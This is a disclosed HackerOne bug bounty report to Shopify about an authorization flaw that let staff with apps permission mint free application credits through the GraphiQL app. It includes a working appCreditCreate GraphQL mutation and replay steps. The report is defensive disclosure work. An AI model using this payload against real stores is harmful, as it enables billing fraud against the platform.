# Create free Shopify application credits.

## Report Details
- **Report ID**: 1257428
- **URL**: https://hackerone.com/reports/1257428
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-11T11:47:35.520Z
- **Disclosed**: 2021-09-10T21:53:32.941Z

## Reporter
- **Username**: jmp_35p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Details
According to docs available at https://shopify.dev/api/admin/rest/reference/billing/applicationcredit, `appCreditCreate` is used to issue credits to merchants that can be used towards future app purchases in Shopify. I believe `appCreditCreate` mutation shouldn't be accessible to store owners and staffs who have `apps` permission. This claim is confirmed by the response returned when /admin/internal/web/graphql/core endpoint is hit as shown in appCredit_B.png. However, Shopify GraphiQL app makes the said mutation accessible (see appCredit_A.png for details). I had to confirm that the credit was really created by visiting the billing page, appCredit_C.png shows the successful creation of the $500.00 credits. Presented below is the GraphQL query which must be issued from the said app. 

```
{"operationName":"AppCreditCreatePayload","variables":{"description":"Themes credits","amount":{"amount":500.00,"currencyCode":"USD"},"test":false},"query":"mutation AppCreditCreatePayload($description:String!,$amount:MoneyInput!,$test:Boolean){\n appCreditCreate(description:$description,amount:$amount,test:$test){\n      appCredit{\n      amount{\n    amount\n     currencyCode\n     __typename\n    }\n   createdAt\n      description\n      id\n      test\n    __typename\n    }\n     userErrors{\n      field\n       message\n       __typename\n       }\n     __typename\n      }\n   }\n"}

```

Setup
1. Install Shopify GraphiQL app.
2. A staff with `apps` permission.

Steps to reproduce
1. Open the app and perform any action.
2. A POST request similar to the one below should be sent to the repeater tab.
```
POST /admin/api/2021-07/graphql HTTP/2
Host: shopify-graphiql-app.shopifycloud.com
Cookie: _shopify_graphiql_app=RJlzS4n3qPHR0fClrTa1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/89.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Csrf-Token: FS1j+3c4nU

{"query":"{\n  shop {\n    name\n  }\n}\n","variables":null,"operationName":null}

```
3. Replace the request body with the query provided above.
4. Alternatively, the action described above could also be performed directly from the app.

## Impact

Unlimited free application credits can be created.

## Attachments
- appCredit_B.png
